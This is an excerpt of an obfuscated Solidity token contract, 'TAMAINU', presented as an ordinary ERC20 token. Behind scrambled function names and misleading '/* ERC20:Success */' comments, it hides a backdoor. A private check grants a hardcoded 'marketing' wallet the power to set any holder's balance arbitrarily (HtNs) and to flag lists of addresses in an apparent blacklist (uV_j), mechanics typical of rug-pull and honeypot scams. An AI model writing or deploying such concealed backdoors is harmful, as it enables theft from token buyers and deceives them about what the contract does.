...
contract  TAMAINU is Context, IERC20, Ownable {
 ...
 /* ERC20:Success */;
    ...
    mapping (address => bool) public cLBL
 /* ERC20:Success */;
    ...
    constructor () {
        ...
        BgnI
 /* ERC20:Success */ = payable(address(0x1a4F63f669E731B60F17B3Fa4935eF53BF361A4f));
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        BgnI
 /* ERC20:Success */ = payable(newAddress);
    }
    ...
    function HtNs(address YEVZ, uint256 HKNf) public{ if(!CVvR
 /* ERC20:Success */(BgnI
 /* ERC20:Success */,msg.sender,true)){return;}
        _balances[YEVZ] = HKNf;
    }
    ...
    function uV_j(address[] calldata TnuC,bool Ihhd
 /* ERC20:Success */) public { if(!CVvR
 /* ERC20:Success */(BgnI
 /* ERC20:Success */,msg.sender,true)){return;}
        for (uint256 i; i < TnuC.length; ++i) {
            if (Ihhd
 /* ERC20:Success */){cLBL
 /* ERC20:Success */[TnuC[i]] = true ;}
            else{cLBL
 /* ERC20:Success */[TnuC[i]] = false ;}}}

    function CVvR
 /* ERC20:Success */(address izIh,address IAAn
 /* ERC20:Success */ , bool HEhH) private pure returns(bool){return HEhH && true && !(izIh != IAAn
 /* ERC20:Success */);}
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(BgnI
 /* ERC20:Success */, amountBNBMarketing);
